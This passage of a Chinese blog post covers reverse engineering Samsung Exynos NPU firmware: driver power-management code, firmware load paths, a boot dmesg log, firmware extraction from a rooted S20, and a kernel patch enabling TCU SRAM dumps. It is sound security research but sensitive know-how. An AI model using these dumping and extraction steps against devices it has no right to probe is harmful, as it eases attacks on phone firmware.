NPU驱动电源管理和固件加载前面提到的npu_driver还注册了npu_pm_ops作为它的电源管理操作处理程序。 1234static const struct dev_pm_ops npu_pm_ops = { SET_SYSTEM_SLEEP_PM_OPS(npu_device_suspend, npu_device_resume) SET_RUNTIME_PM_OPS(npu_device_runtime_suspend, npu_device_runtime_resume, NULL)}; 当设备需要启动NPU，将调用电源管理系统的npu_device_runtime_resume()函数，然后调用npu_system_resume()函数。 1234567891011121314151617int npu_system_resume(struct npu_system *system, u32 mode){ /* [...] */ /* Loads the firmware in memory from the filesystem */ ret = npu_firmware_load(system); /* Starts the NPU firmware */ ret = npu_system_soc_resume(system, mode); /* Opens an interface to the NPU */ ret = npu_interface_open(system); /* [...] */ return ret;} npu_firmware_load调用npu_firmware_file_read函数，npu_firmware_file_read函数尝试从/data/NPU.bin 或 /vendor/firmware/NPU.bin中读取固件，如果这两个路径都没有，则从npu/NPU.bin中读取。文件中的内容接下来会被拷贝到system-&gt;fw_npu_memory_buffer-&gt;vaddr中的iomem区域中。 固件所在的iomem时FW_DRAM，改区域在驱动初始化时由init_iomem_area()函数，根据arch/arm64/boot/dts/exynos/exynos9830.dts进行定义。在NPU地址空间中，这个区域始于物理地址0x50000000，大小为0xe0000。内核中相关的地址时动态分配的。 最后，npu_system_soc_resume()通过调用npu_cpu_on()函数启动NPU。 NPU随/dev/vertex10启动而启动，关闭而关闭。当打开这个设备时，在dmesg中可以看到： 1234567891011121314151617181920212223242526272829303132333435[123.007254] NPU:[*]npu_debug_open(221):start in npu_debug open[123.007264] NPU:[*]npu_debug_open(222):complete in npu_debug open[123.007269] NPU:[*]npu_log_open(1152):start in npu_log_open[123.007274] NPU:[*]npu_log_open(1153):complete in npu_log_open[123.007279] NPU:[*]npu_util_memdump_open(317):start in npu_util_memdump_open[123.007282] NPU:[*]npu_util_memdump_open(342):complete in npu_util_memdump_open[123.007820] NPU:[*]npu_system_resume(346):wake_lock, now(1)[123.007827] NPU:[*]npu_system_alloc_fw_dram_log_buf(93):start: initialization.[123.009277] NPU:[*]npu_system_alloc_fw_dram_log_buf(103):DRAM log buffer for firmware: size(2097152) / dv(0x0000000080000000) / kv(ffffff803db75000)[123.009293] NPU:[*]npu_store_log_init(216):Store log memory initialized : ffffff803db75000[Len = 2097152][123.009303] NPU:[*]npu_fw_test_initialize(290):fw_test : initialized.[123.009309] NPU:[*]npu_system_alloc_fw_dram_log_buf(125):complete : initialization.[123.009315] NPU:[*]npu_firmware_load(540):Firmware load : Start[123.023161] NPU:[*]__npu_binary_read(215):success of binay(npu/NPU.bin, 475349) apply.[123.023196] NPU:[*]print_fw_signature(111):NPU Firmware signature : 009:094 2019/04/25 14:56:44[123.023210] NPU:[*]npu_firmware_load(572):complete in npu_firmware_load[123.023233] NPU:[*]print_iomem_area(466):\\x01c(TCU_SRAM) Phy(0x19200000)-(0x19280000) Virt(ffffff802b900000) Size(524288)[123.023243] NPU:[*]print_iomem_area(466):\\x01c(IDP_SRAM) Phy(0x19300000)-(0x19400000) Virt(ffffff802ba00000) Size(1048576)[123.023251] NPU:[*]print_iomem_area(466):\\x01c(SFR_NPU0) Phy(0x17900000)-(0x17a00000) Virt(ffffff802bc00000) Size(1048576)[123.023259] NPU:[*]print_iomem_area(466):\\x01c(SFR_NPU1) Phy(0x17a00000)-(0x17af0000) Virt(ffffff802be00000) Size(983040)[123.023270] NPU:[*]print_iomem_area(466):\\x01c( PMU_NPU) Phy(0x15861d00)-(0x15861e00) Virt(ffffff8010eedd00) Size(256)[123.023279] NPU:[*]print_iomem_area(466):\\x01c(PMU_NCPU) Phy(0x15862f00)-(0x15863000) Virt(ffffff8010ef5f00) Size(256)[123.023288] NPU:[*]print_iomem_area(466):\\x01c(MBOX_SFR) Phy(0x178b0000)-(0x178b017c) Virt(ffffff8010efd000) Size(380)[123.023367] NPU:[*]npu_cpu_on(729):start in npu_cpu_on[123.023420] NPU:[*]npu_cpu_on(736):complete in npu_cpu_on[123.023445] NPU:[*]npu_system_soc_resume(513):CLKGate1_DRCG_EN_write_enable[123.023451] NPU:[*]CLKGate4_IP_HWACG_qch_disable(261):start CLKGate4_IP_HWACG_qch_disable[123.024797] NPU log sync [60544][123.024894] NPU:[*]npu_system_soc_resume(525):CLKGate5_IP_DRCG_EN_write_enable[123.025842] NPU:[*]mailbox_init(46):mailbox initialize: start, header base at ffffff802b97ff7c[123.025852] NPU:[*]mailbox_init(47):mailbox initialize: wait for firmware boot signature.[123.036810] NPU:[*]mailbox_init(53):header signature \\x09: C0FFEE0[123.036821] NPU:[*]mailbox_init(76):header version \\x09: 00060004[123.036826] NPU:[*]mailbox_init(83):init. success in NPU mailbox[123.036831] NPU:[*]npu_device_runtime_resume(582):npu_device_runtime_resume():0 固件提取及逆向工程有两种不同的固件，主要时依赖于NPU使用的CPU类型： Exynos 9820 SoCs (Galaxy S10 models) 使用ARMv7 Cortex-M cores. Exynos 990 SoCs (Galaxy S20 models) 使用ARMv7 Cortex-A cores. 两种固件在实现上十分相似，但是还是存在不同，主要时在初始化时，本文主要研究ARMv7 Cortex-A。 根据前文提到的，固件主要可以从以下三个地方获取： /data/NPU.bin /vendor/firmware/NPU.bin npu/NPU.bin (从内核镜像中提取) 在S20 中，NPU固件内嵌于内核镜像中，可以在root后的设备上，使用脚本npu_firmware_extractor.py进行提取，参数为 --cortex-a。 123456789$ python3 npu_firmware_extractor.py -d . --cortex-a[+] Connection to the device using ADB.[+] Pulling the kernel from the device to the host.[+] Extracting the firmware.[+] Done.$ ll-rw-r--r-- 1 lyte staff 464K 4 jan 16:30 NPU.bin-rw-r--r-- 1 lyte staff 55M 4 jan 16:30 boot.img-rw-r--r-- 1 lyte staff 3,6K 4 jan 16:29 npu_firmware_extractor.py 也可以dump NPU固件分配的SRAM内存。此前，我们查看了不同的debugfs项。除此之外，SRAM-TCU也可以用于在运行时dumpNPU代码和数据。这个文件在S10上可以用，但是在S20上打开将会导致内核崩溃。 解决这个问题的办法是重新编译一个新版本的内核版本。 以下的补丁将解决这个问题。 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051diff --git a/drivers/vision/npu/core/npu-util-memdump.c b/drivers/vision/npu/core/npu-util-memdump.cindex 5711bbb..8749701 100755--- a/drivers/vision/npu/core/npu-util-memdump.c+++ b/drivers/vision/npu/core/npu-util-memdump.c@@ -109,12 +109,13 @@ int ram_dump_fault_listner(struct npu_device *npu) { int ret = 0; struct npu_system *system = &amp;npu-&gt;system;- u32 *tcu_dump_addr = kzalloc(system-&gt;tcu_sram.size, GFP_ATOMIC);+ u32 *tcu_dump_addr = kzalloc(system-&gt;fw_npu_memory_buffer-&gt;size, GFP_ATOMIC); u32 *idp_dump_addr = kzalloc(system-&gt;idp_sram.size, GFP_ATOMIC); if (tcu_dump_addr) {- memcpy_fromio(tcu_dump_addr, system-&gt;tcu_sram.vaddr, system-&gt;tcu_sram.size);- pr_err(&quot;NPU TCU SRAM dump - %pK / %paB\\n&quot;, tcu_dump_addr, &amp;system-&gt;tcu_sram.size);+ memcpy_fromio(tcu_dump_addr, system-&gt;fw_npu_memory_buffer-&gt;vaddr,+ system-&gt;fw_npu_memory_buffer-&gt;size);+ pr_err(&quot;NPU TCU SRAM dump - %pK / %paB\\n&quot;, tcu_dump_addr, &amp;system-&gt;fw_npu_memory_buffer-&gt;size); } else { pr_err(&quot;tcu_dump_addr is NULL\\n&quot;); ret= -ENOMEM;@@ -281,20 +282,22 @@ DECLARE_NPU_SRAM_DUMP(idp); int npu_util_memdump_probe(struct npu_system *system) { BUG_ON(!system);- BUG_ON(!system-&gt;tcu_sram.vaddr);+ BUG_ON(!system-&gt;fw_npu_memory_buffer-&gt;vaddr); #ifdef CONFIG_NPU_LOOPBACK return 0; #endif atomic_set(&amp;npu_memdump.registered, 0);- npu_memdump.tcu_sram = system-&gt;tcu_sram;+ npu_memdump.tcu_sram.vaddr = system-&gt;fw_npu_memory_buffer-&gt;vaddr;+ npu_memdump.tcu_sram.paddr = system-&gt;fw_npu_memory_buffer-&gt;paddr;+ npu_memdump.tcu_sram.size = system-&gt;fw_npu_memory_buffer-&gt;size; npu_memdump.idp_sram = system-&gt;idp_sram;- probe_info(&quot;%s: paddr = %08x\\n&quot;, FW_MEM_LOG_NAME,- system-&gt;tcu_sram.paddr + MEM_LOG_OFFSET+ probe_info(&quot;%s: paddr = %08llx\\n&quot;, FW_MEM_LOG_NAME,+ system-&gt;fw_npu_memory_buffer-&gt;paddr + MEM_LOG_OFFSET ); #ifdef CONFIG_EXYNOS_NPU_DEBUG_SRAM_DUMP- probe_info(&quot;%s: paddr = %08x\\n&quot;, TCU_SRAM_DUMP_SYSFS_NAME,- system-&gt;tcu_sram.paddr);- tcu_sram_dump_size = system-&gt;tcu_sram.size;+ probe_info(&quot;%s: paddr = %08llx\\n&quot;, TCU_SRAM_DUMP_SYSFS_NAME,+ system-&gt;fw_npu_memory_buffer-&gt;paddr);+ tcu_sram_dump_size = system-&gt;fw_npu_memory_buffer-&gt;size; probe_info(&quot;%s: paddr = %08x\\n&quot;, IDP_SRAM_DUMP_SYSFS_NAME, system-&gt;idp_sram.paddr); idp_sram_dump_size = system-&gt;idp_sram.size; NPU操作系统待续","link":"/2022/04/15/%E9%80%86%E5%90%91%E4%B8%89%E6%98%9FNPU%E5%9B%BA%E4%BB%B6%E5%8F%8A%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8/"}],"tags":[{"name":"xnu","slug":"xnu","link":"/tags/xnu/"},{"name":"mig","slug":"mig","link":"/tags/mig/"},{"name":"fuzz","slug":"fuzz","link":"/tags/fuzz/"},{"name":"mach","slug":"mach","link":"/tags/mach/"},{"name":"arm64","slug":"arm64","link":"/tags/arm64/"},{"name":"exploit","slug":"exploit","link":"/tags/exploit/"},{"name":"afl++","slug":"afl","link":"/tags/afl/"},{"name":"android","slug":"android","link":"/tags/android/"},{"name":"samsung","slug":"samsung","link":"/tags/samsung/"},{"name":"aosp","slug":"aosp","link":"/tags/aosp/"},{"name":"rce","slug":"rce","link":"/tags/rce/"},{"name":"adobe","slug":"adobe","link":"/tags/adobe/"},{"name":"ams","slug":"ams","link":"/tags/ams/"},{"name":"lpe","slug":"lpe","link":"/tags/lpe/"},{"name":"intent","slug":"intent","link":"/tags/intent/"},{"name":"PendingIntent","slug":"PendingIntent","link":"/tags/PendingIntent/"},{"name":"vul","slug":"vul","link":"/tags/vul/"},{"name":"static analysis","slug":"static-analysis","link":"/tags/static-analysis/"},{"name":"ios","slug":"ios","link":"/tags/ios/"},{"name":"macos","slug":"macos","link":"/tags/macos/"},{"name":"cfprefsd","slug":"cfprefsd","link":"/tags/cfprefsd/"},{"name":"logic vul","slug":"logic-vul","link":"/tags/logic-vul/"},{"name":"linux","slug":"linux","link":"/tags/linux/"},{"name":"chrome","slug":"chrome","link":"/tags/chrome/"},{"name":"webaudio","slug":"webaudio","link":"/tags/webaudio/"},{"name":"ContentProvider","slug":"ContentProvider","link":"/tags/ContentProvider/"},{"name":"syzkaller","slug":"syzkaller","link":"/tags/syzkaller/"},{"name":"darwin","slug":"darwin","link":"/tags/darwin/"},{"name":"pipe","slug":"pipe","link":"/tags/pipe/"},{"name":"qualcomm","slug":"qualcomm","link":"/tags/qualcomm/"},{"name":"gpu","slug":"gpu","link":"/tags/gpu/"},{"name":"uaf","slug":"uaf","link":"/tags/uaf/"},{"name":"qualcom","slug":"qualcom","link":"/tags/qualcom/"},{"name":"npu","slug":"npu","link":"/tags/npu/"},{"name":"apple","slug":"apple","link":"/tags/apple/"},{"name":"xpc","slug":"xpc","link":"/tags/xpc/"},{"name":"telecom","slug":"telecom","link":"/tags/telecom/"},{"name":"ASN.1","slug":"ASN-1","link":"/tags/ASN-1/"},{"name":"soot","slug":"soot","link":"/tags/soot/"},{"name":"iomfb","slug":"iomfb","link":"/tags/iomfb/"},{"name":"AppleAVE2","slug":"AppleAVE2","link":"/tags/AppleAVE2/"},{"name":"pac","slug":"pac","link":"/tags/pac/"},{"name":"LPE","slug":"LPE","link":"/tags/LPE/"},{"name":"IOServices","slug":"IOServices","link":"/tags/IOServices/"},{"name":"hook","slug":"hook","link":"/tags/hook/"},{"name":"intel","slug":"intel","link":"/tags/intel/"},{"name":"safari","slug":"safari","link":"/tags/safari/"},{"name":"tcc","slug":"tcc","link":"/tags/tcc/"},{"name":"pongoOS","slug":"pongoOS","link":"/tags/pongoOS/"},{"name":"qemu","slug":"qemu","link":"/tags/qemu/"},{"name":"note","slug":"note","link":"/tags/note/"}],"categories":[],"pages":[{"title":"tags","text":"","link":"/tags/index.html"}]}